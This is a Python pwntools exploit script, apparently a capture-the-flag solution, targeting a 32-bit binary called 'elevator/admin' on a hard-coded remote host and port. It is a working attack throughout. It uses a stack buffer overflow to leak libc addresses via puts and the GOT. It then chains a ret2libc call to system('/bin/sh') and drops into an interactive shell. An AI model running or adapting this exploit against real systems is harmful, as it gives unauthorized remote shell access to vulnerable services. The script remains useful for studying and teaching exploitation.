#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=0.0.0.0' '--port=1000' elevator/admin
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'elevator/admin')
libc =ELF("libc6-i386_2.35-0ubuntu3.7_amd64.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '103.191.63.187'
port = int(args.PORT or 5000)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b kabar
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x8048000)
# Stack:    Executable
# RWX:      Has RWX segments
def leak(func_name):
    p=b"A"*1036
    p+=p32(exe.plt["puts"])
    p+=p32(exe.sym["main"])
    p+=p32(exe.got[func_name])
    io.sendlineafter(b"\n",p)
    io.recvuntil(b"Same.\n")

    recv = u32(io.recvline()[:4].ljust(4, b"\x00"))
    log.success(f"got@{func_name} = {hex(recv)}")
    return recv

def ret2libc():
    BINSH=next(libc.search(b"/bin/sh"))
    SYSTEM=libc.sym["system"]
    p=b"A"*1036
    p+=p32(SYSTEM)
    p+=p32(exe.sym["main"])
    p+=p32(BINSH)
    io.sendlineafter(b"\n",p)
    io.recvuntil(b"Same.\n")

io = start()
leak("puts")
leak("__libc_start_main")
leak("setbuf")
leak_gets = leak("gets")

libc.address = leak_gets - libc.sym["gets"]
print(hex(libc.address))
ret2libc()



io.interactive()

